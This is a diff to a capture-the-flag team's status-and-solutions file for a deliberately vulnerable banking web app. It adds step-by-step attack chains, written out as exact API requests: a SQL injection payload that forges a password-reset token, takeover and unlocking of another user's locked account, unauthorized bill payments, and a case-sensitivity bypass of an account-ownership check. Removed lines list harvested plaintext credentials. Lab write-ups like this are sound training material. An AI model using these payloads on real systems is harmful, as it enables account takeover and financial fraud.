@@ -1,7 +1,7 @@
 # DarkMoney CTF — Status & Solutions
 
-**Competition:** Schwab 2026 Advanced | **Team score:** 2420 | **Team rank:** improving  
-**Progress:** 16 of 37 challenges solved  
+**Competition:** Schwab 2026 Advanced | **Team score:** 6040 | **Team rank:** improving  
+**Progress:** 29 of 37 challenges solved  
 **Target:** https://50-18-145-16-darkmoneyprod.vulnerablesites.net  
 **Tracker:** https://crwd-ctrl.net/d9e8f33f-db5e-405c-8236-499d2f0df794  
 **Account:** Alice Morgan (user ID 1, clientId DM-CLIENT-A9F131)
@@ -44,8 +44,9 @@
 | The Name Checks Out | Hippo | 200 | SQLi dump of `partner_bank_user` table reveals plaintext passwords → auth as `atlantis.h1pp0:7e3023bfc3bb1666fe3a0e76` via `POST /api/partner-banks/1/auth` → crwd-ctrl auto-detected |
 
 | Frozen Assets | Alpaca | 200 | SQLi reset grahman's (user 5) password → `POST /api/auth/reset-password` with token unlocks LOCKED account → login as grahman → `POST /api/bill-pay/payments` with `fromAccountNumber: "DMACC1005"` → auto-detected |
+| Mirror Ledger | Alpaca | 250 | Java `startsWith("DMACCEXT")` check is case-sensitive but MySQL lookup is case-insensitive — send lowercase `dmaccext0001` as `fromAccountNumber` to bypass guard while DB resolves the shadow account → auto-detected |
 
-**Total earned: 5790 pts**
+**Total earned: 6040 pts**
 
 ---
 
@@ -167,28 +168,6 @@
 - **Response:** `{"link_signing_key":"D3E346z93-ecbT72d2c9a66e", ...}`
 - **Submission:** Submitted `D3E346z93-ecbT72d2c9a66e` to crwd-ctrl SUBMIT form under "Signing Key" field (+300 pts)
 
-### Frozen Assets (Alpaca) — IN PROGRESS
-- **Vector:** Bypass UI restriction to fund bill payment from frozen account
-- **Hint:** "An option removed from the screen is not an option forbidden. Find the path the interface does not offer, and fund a bill payment from the account that was told to sit still."
-- **Target account:** DMACC1005 (user 5's LOCKED account, balance $101,920)
-- **Problem:** `POST /api/bill-pay/payments` with `fromAccountNumber: "DMACC1005"` returns 400 "Account DMACC1005 is not owned or linked by amorgan"
-- **Partner bank auth flow discovered:**
-  - `POST /api/partner-banks/{id}/auth` with `{username, password}` → returns `linkToken` (JWT, iss: "darkmoney-partner-bank")
-  - Token passed as `Authorization: Bearer <token>` to `GET /api/partner-banks/{id}/accounts`
-  - `POST /api/linked-accounts` with `{partnerBankAccountId, nickname, linkToken}` creates linked account with shadow DM account number (DMACCEXT*)
-- **Credentials found via SQLi on `partner_bank_user` table:**
-  - `atlantis.customer:Tr1ton&Reef2026` (IDs 1–2: ATL10024021 checking $8k, ATL10029930 savings $4.2k)
-  - `atlantis.h1pp0:7e3023bfc3bb1666fe3a0e76` (ID 3: ATL10037431 checking $6.3k)
-  - `gross.notional:Pr3z1si0n#GN26`
-  - `konza.member:Pra1ri3$Konza7`
-  - `fu.exchange:W1re&Underw00d8`
-  - `sovereign.holder:D1scr33t$SUD19`
-  - `gilded.trust:G0ld3n@Reserve4`
-  - `sylvan.member:C0mmun1ty&Sylv0`
-- **Linked h1pp0's ATL10037431 to Alice** → shadow account DMACCEXT0008 created (ACTIVE, $6.3k)
-- **Still failing:** `fromAccountNumber: "DMACC1005"` still returns "not owned or linked" even after linking h1pp0's Atlantis account
-- **Next:** Try paying from DMACCEXT0008 or ATL10037431 account numbers, or find which account maps to the $101,920 balance
-
 ---
 
 ## 🔒 LOCKED / NOT YET UNLOCKED
@@ -202,6 +181,25 @@ Additional challenges are still locked (unlock by completing prerequisites):
 ---
 
 ## Solution Details
+
+### Frozen Assets — 200 pts ✅
+- **Vulnerability:** Broken ownership check — API validates `fromAccountNumber` is owned/linked by current session, but doesn't check if the account owner is locked
+- **Hint:** "An option removed from the screen is not an option forbidden. Find the path the interface does not offer, and fund a bill payment from the account that was told to sit still."
+- **Key insight:** Need to log in AS the account owner (user 5, grahman) to pay from their account — use Second Chances SQLi to reset their password and unlock the LOCKED account
+- **Exact attack chain:**
+  1. SQLi to create password reset token: `GET /api/transactions?search=%25' OR reset_password_token('grahman','Test@DM456!')>'a' OR '1'='`
+  2. Activate reset + unlock account: `POST /api/auth/reset-password` `{"token":"Test@DM456!","password":"Gr4hman@2026!"}` → `{success:true}` (also resets consecutive_failed_attempts, sets status ACTIVE)
+  3. Login as grahman: `POST /api/auth/login` `{"username":"grahman","password":"Gr4hman@2026!"}` → `{success:true,blocked:false}`
+  4. Create bill payee: `POST /api/bill-pay/payees` `{"name":"Illumistrami Holdings","accountIdentifier":"987654321","type":"COMPANY","category":"UTILITIES","nickname":"Illumistrami"}` → payeeId: 12
+  5. Pay from DMACC1005: `POST /api/bill-pay/payments` `{"payeeId":12,"fromAccountNumber":"DMACC1005","amount":1000,"sendDate":"2026-11-10","memo":"payment","schedule":{"frequency":"ONE_TIME"}}` → 200, paymentId: BP-000129
+- **Proof:** crwd-ctrl auto-detected on the bill pay success response (+200 pts)
+
+### Mirror Ledger — 250 pts ✅
+- **Vulnerability:** Case-sensitivity mismatch — Java guard uses `String.startsWith("DMACCEXT")` (case-sensitive) but MySQL account lookup is case-insensitive
+- **Hint:** "It rejects the account by its number, matched exactly as written. But the lookup underneath is not so careful."
+- **Key insight:** Send `fromAccountNumber` in lowercase — Java's `startsWith("DMACCEXT")` fails (guard bypassed) but MySQL resolves `dmaccext0001` → `DMACCEXT0001` anyway
+- **Exact request:** `POST /api/bill-pay/payments` `{"payeeId":1,"fromAccountNumber":"dmaccext0001","amount":100,"sendDate":"2026-11-10","memo":"test","schedule":{"frequency":"ONE_TIME"}}` → 200, paymentId: BP-000130
+- **Proof:** crwd-ctrl auto-detected on the bill pay success response (+250 pts)
 
 ### Things You Were Asked Not to See — 70 pts — Flag: `ROBOTS_ARE_NOT_GUARDS`
 1. `GET /robots.txt` → reveals `Disallow: /debug`, `/test`, `/secrets`
